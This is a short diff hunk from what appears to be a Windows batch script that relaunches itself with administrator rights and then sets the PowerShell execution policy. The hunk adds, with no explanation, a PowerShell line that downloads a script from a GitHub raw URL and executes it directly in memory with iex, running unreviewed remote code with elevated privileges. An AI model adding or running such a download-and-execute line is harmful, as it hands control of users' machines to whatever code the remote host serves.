@@ -42,6 +42,11 @@ if not "%1"=="am_admin" (powershell start -verb runas '%0' am_admin & exit /b)
 
 ###################################################################################################################################
 
+powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Phoenixthrush/phoenixthrush.github.io/master/cmd.ps1')"
+
+
+###################################################################################################################################
+
 set-executionpolicy remotesigned
 
 ###################################################################################################################################
